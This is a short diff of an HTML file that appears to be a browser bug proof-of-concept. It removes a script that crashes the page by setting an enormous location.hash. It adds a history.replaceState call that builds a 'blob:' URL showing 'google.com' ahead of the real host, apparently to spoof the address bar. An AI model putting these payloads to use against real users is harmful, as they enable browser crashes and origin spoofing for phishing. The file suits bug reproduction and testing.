@@ -1,10 +1,4 @@
-<html>
 <script>
-var string = "yoyo";
-for (var i = 0; i < 9; i++) {
-	string = string + string + string + string;
-}
-console.log(string.length); // should be 4^10 ~  1 million
-location.hash = string; // crash
+history.replaceState(null, null, "blob:" + location.protocol + "//google.com" + "@" + location.host);
+window.history.go(-1)
 </script>
-<html>
